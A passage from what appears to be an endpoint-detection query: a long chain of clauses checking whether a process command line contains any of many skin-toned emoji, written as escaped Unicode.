\"\ud83c\udfcb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffe\" or tgt.process.cmdline contains \"\u270b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffe\" or tgt.process.cmdline contains \"\u270c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffe\" or tgt.process.cmdline contains \"\u261d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffe\" or tgt.process.cmdline contains \"\u270a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffe\" or tgt.process.cmdline contains \"\u270d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udfff\" or tgt.process.cmdline contains \"\u270b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udfff\" or tgt.process.cmdline contains \"\u270c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udfff\" or tgt.process.cmdline contains \"\u261d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udfff\" or tgt.process.cmdline contains \"\u270a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udfff\" or tgt.process.cmdline contains 